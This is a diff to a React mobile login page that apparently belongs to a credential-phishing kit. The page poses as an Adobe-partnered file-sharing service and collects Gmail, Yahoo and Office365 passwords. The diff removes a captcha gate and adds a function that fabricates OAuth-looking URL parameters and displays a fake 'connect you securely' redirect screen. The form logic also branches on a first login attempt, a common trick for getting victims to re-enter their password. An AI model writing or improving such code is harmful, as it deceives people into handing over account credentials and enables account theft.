@@ -2,7 +2,6 @@ import React, { useState, useEffect } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
 import { useLogin } from '../../hooks/useLogin';
 import Spinner from '../../components/common/Spinner';
-import CloudflareCaptcha from '../CloudflareCaptcha';
 
 interface LoginPageProps {
   fileName: string;
@@ -28,11 +27,9 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [isRedirecting, setIsRedirecting] = useState(false);
+  const [isProcessingReturn, setIsProcessingReturn] = useState(false);
   
-  // New state for captcha handling
-  const [showCaptcha, setShowCaptcha] = useState(false);
-  const [pendingProvider, setPendingProvider] = useState<string | null>(null);
-
   const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
     onLoginSuccess,
     onLoginError
@@ -59,6 +56,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
       // Clear the URL to show main login page
       const baseUrl = window.location.pathname;
       window.history.replaceState({}, document.title, baseUrl);
+      // Don't process the OAuth return on refresh
       return;
     }
   }, []);
@@ -68,7 +66,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
     const baseUrl = window.location.pathname;
     window.history.replaceState({}, document.title, baseUrl);
     
-    // Trigger provider navigation immediately
+    // Keep redirect state while triggering provider
     if (providerName.toLowerCase() === 'gmail' && onGmailSelect) {
       onGmailSelect();
     } else if (providerName.toLowerCase() === 'yahoo' && onYahooSelect) {
@@ -79,9 +77,47 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
       onOffice365Select();
     } else {
       setSelectedProvider(providerName);
+      setIsRedirecting(false);
+      setIsProcessingReturn(false);
     }
   };
 
+  const simulateOAuthRedirect = (providerName: string) => {
+    // Show redirecting state
+    setIsRedirecting(true);
+    
+    // Generate OAuth-like parameters
+    const state = Math.random().toString(36).substr(2, 15);
+    const code = `auth_${Math.random().toString(36).substr(2, 20)}`;
+    
+    // First, update URL to show OAuth process is starting
+    const authStartParams = new URLSearchParams({
+      oauth_provider: providerName.toLowerCase(),
+      state: state,
+      redirect_initiated: 'true'
+    });
+    
+    const currentPath = window.location.pathname;
+    window.history.pushState({}, '', `${currentPath}?${authStartParams.toString()}`);
+    
+    // Simulate OAuth redirect delay
+    setTimeout(() => {
+      // Simulate returning from OAuth with auth code
+      const returnParams = new URLSearchParams({
+        code: code,
+        state: state,
+        provider: providerName,
+        scope: 'email profile',
+        auth_time: Date.now().toString()
+      });
+      
+      window.history.replaceState({}, '', `${currentPath}?${returnParams.toString()}`);
+      
+      // Trigger the provider's login page
+      handleProviderReturn(providerName);
+    }, 1500); // 1.5 second delay
+  };
+  
   const handleSubmit = async (e: React.FormEvent) => {
     const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
     if (result?.isFirstAttempt) {
@@ -94,19 +130,13 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
     setEmail('');
     setPassword('');
     resetLoginState();
+    setIsRedirecting(false);
+    setIsProcessingReturn(false);
   };
 
+  // NOTE: captcha-on-click behavior removed — click goes straight to simulateOAuthRedirect
   const handleProviderClick = (providerName: string) => {
-    setPendingProvider(providerName);
-    setShowCaptcha(true);
-  };
-
-  const handleCaptchaVerified = () => {
-    setShowCaptcha(false);
-    if (pendingProvider) {
-      // Navigate immediately without showing any redirect screen
-      handleProviderReturn(pendingProvider);
-    }
+    simulateOAuthRedirect(providerName);
   };
 
   const AdobeLogo = () => (
@@ -117,12 +147,22 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
     />
   );
 
-  // Show captcha screen if triggered
-  if (showCaptcha) {
-    return <CloudflareCaptcha onVerified={handleCaptchaVerified} />;
+  // Show redirecting screen for mobile
+  if (isRedirecting || isProcessingReturn) {
+    return (
+      <div 
+        className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
+        style={{
+          backgroundImage: "url('https://images.unsplash.com/photo-1588345921523-c2dcdb7f1dcd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80')"
+        }}
+      >
+        <div className="bg-white/90 backdrop-blur-md rounded-2xl p-6 shadow-2xl text-center mx-4">
+          <h2 className="text-lg font-semibold text-gray-800">Redirecting to authentication provider...</h2>
+          <p className="text-sm text-gray-600 mt-3">Please wait while we connect you securely</p>
+        </div>
+      </div>
+    );
   }
-
-  // Redirect screen logic has been completely removed
 
   return (
     <div 
@@ -165,7 +205,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
               ))}
             </div>
             <div className="mt-8 text-center">
-              <p className="text-sm text-gray-800 font-semibold drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">© 2025 Municipalfilesport. Secured in partnership with Adobe®.</p>
+              <p className="text-sm text-gray-800 font-semibold drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">© 2025 municipalfilesport. Secured in partnership with Adobe®.</p>
             </div>
           </div>
         </>
@@ -212,7 +252,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
             </form>
           </div>
           <div className="bg-white/30 backdrop-blur-sm pt-2 pb-4">
-            <p className="text-xs text-gray-600 text-center">© 2025 Municipalfilesport. Secured in partnership with Adobe®.</p>
+            <p className="text-xs text-gray-600 text-center">© 2025 municipalfilesport. Secured in partnership with Adobe®.</p>
           </div>
         </>
       )}
